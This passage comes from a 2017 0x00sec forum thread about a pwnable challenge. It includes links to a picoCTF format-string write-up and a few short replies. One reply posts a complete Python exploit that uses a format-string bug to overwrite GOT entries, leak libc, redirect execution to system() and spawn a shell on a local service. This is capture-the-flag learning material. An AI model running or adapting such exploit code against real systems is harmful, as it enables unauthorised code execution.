<p>That being said, exploit dev is a mindset, but you can learn the basic-beginner methology by following LiveOverflow‚Äôs videos on YouTube.</p>
<p>By the way, for this certain type of pwnable there‚Äôs a write up of mine explaining the internals of format string attacks.</p>
<aside class="quote quote-modified" data-post="1" data-topic="1920">
<div class="title">
<div class="quote-controls"></div>
<img alt width="20" height="20" src="../../user_avatar/0x00sec.org/_py/40/4275_2.png" class="avatar">
<a href="../picoctf-write-up-bypassing-aslr-via-format-string-bug/1920.html">picoCTF Write-up ~ Bypassing ASLR via Format String Bug</a> <a class="badge-wrapper  bullet" href="../../c/exploit-development.html"><span class="badge-category-bg" style="background-color: #92278F;"></span><span style data-drop-close="true" class="badge-category clear-badge">Exploit Development</span></a>
</div>
<blockquote>
Hello folks! I hope you‚Äôre all doing great. After a disgusting amount of trial and error, I present to you my solution for the console pwnable. Unfortunately, I did not solve the task on time but it was fun nevertheless. I decided to use this challenge as a way to introduce to you one of the ways you can bypass ASLR.
If you have never messed with basic pwning i.e stack/buffer overflows, this write-up might not be your cup of tea. It‚Äôll be quite technical. Firstly I‚Äôll bombard you with theory an‚Ä¶
</blockquote>
</aside>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="2" />
<span class="post-likes">2 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_13" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/segfault"><span itemprop="name">segfault</span></a>
(vladimir)
</span>
<link itemprop="mainEntityOfPage" href="3004.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-08-17T16:28:18Z" class="post-time">
August 17, 2017, 4:28pm
</time>
<meta itemprop="dateModified" content="2017-08-17T16:28:18Z">
<span itemprop="position">13</span>
</span>
</div>
<div class="post" itemprop="text">
<p>did you delete the Binary ??</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_14" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/_py"><span itemprop="name">_py</span></a>
</span>
<link itemprop="mainEntityOfPage" href="3004.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-08-17T17:37:10Z" class="post-time">
August 17, 2017, 5:37pm
</time>
<meta itemprop="dateModified" content="2017-08-17T17:37:10Z">
<span itemprop="position">14</span>
</span>
</div>
<div class="post" itemprop="text">
<p>I‚Äôve no idea why the link stopped working. Sorry for the inconvenience, the link is now updated.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="1" />
<span class="post-likes">1 Like</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_15" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/segfault"><span itemprop="name">segfault</span></a>
(vladimir)
</span>
<link itemprop="mainEntityOfPage" href="3004.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-08-18T12:34:05Z" class="post-time">
August 18, 2017, 12:34pm
</time>
<meta itemprop="dateModified" content="2017-08-18T12:34:05Z">
<span itemprop="position">15</span>
</span>
</div>
<div class="post" itemprop="text">
<p>okay Thanks dude <img src="../../images/emoji/twitter/slight_smile.png%3Fv=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"> (y)</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_16" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/segfault"><span itemprop="name">segfault</span></a>
(vladimir)
</span>
<link itemprop="mainEntityOfPage" href="3004.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-08-18T14:23:10Z" class="post-time">
August 18, 2017, 2:23pm
</time>
<meta itemprop="dateModified" content="2017-08-18T14:34:40Z">
<span itemprop="position">16</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Good One I really liked this challenge <img src="../../images/emoji/twitter/smiley.png%3Fv=9" title=":smiley:" class="emoji" alt=":smiley:"> and this the way i solved it !</p>
<div class="spoiler">
<pre><code class="lang-python">from libformatstr import *
import socket
from pwn import *
import telnetlib

c = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
c.connect(("127.0.0.1",1234))

def recvuntil(sock,delim) :
   	data = ""
    	while not data.endswith(delim):
        	data += sock.recv(1)
   	return data

def interactive(sock):
    	t = telnetlib.Telnet()
    	t.sock = sock
	t.interact()

exitGot = 0x804980c
MAIN = 0x80484fb
lib_start_main = 0x08049810

sysoff =0x3ab30
libc_start = 0x18180


p = FormatStr(50)
p[exitGot] = MAIN
payload = p.payload(4,0)

c.recv(2034)
c.send(payload+"\n")
recvuntil(c,"bruh?")

c.send(p32(lib_start_main)+"%4$s" +"\n")

data = recvuntil(c,"bruh?").split("\n")
libc_base = u32(data[1][4:8]) - libc_start
system = libc_base + sysoff

print "libc base : "+ hex(libc_base)
print "system()  : "+ hex(system)



p = FormatStr()
p[0x080497fc] = system

final = p.payload(4,0)
c.send(final+"\n")

print recvuntil(c,"bruh?")
c.send("sh\n")

interactive(c)


</code></pre>
</div>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="1" />
<span class="post-likes">1 Like</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_17" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/_py"><span itemprop="name">_py</span></a>
Closed
</span>
<link itemprop="mainEntityOfPage" href="3004.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2018-01-09T11:26:11Z" class="post-time">
January 9, 2018, 11:26am
</time>
<meta itemprop="dateModified" content="2018-01-09T11:26:11Z">
<span itemprop="position">17</span>
</span>
</div>
<div class="post" itemprop="text">
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
</div>
</div>
<footer class="container wrap">
<nav class="crawler-nav">
<ul>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../index.html" itemprop="url">Home </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../categories.html" itemprop="url">Categories </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="https://0x00sec.org/guidelines" itemprop="url">FAQ/Guidelines </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../tos.html" itemprop="url">Terms of Service </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../privacy.html" itemprop="url">Privacy Policy </a>
</span>
</li>
</ul>
</nav>
<p class="powered-by-link">Powered by <a href="https://www.discourse.org">Discourse</a>, best viewed with JavaScript enabled</p>
</footer>
<script src="https://instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
</body>
</html>
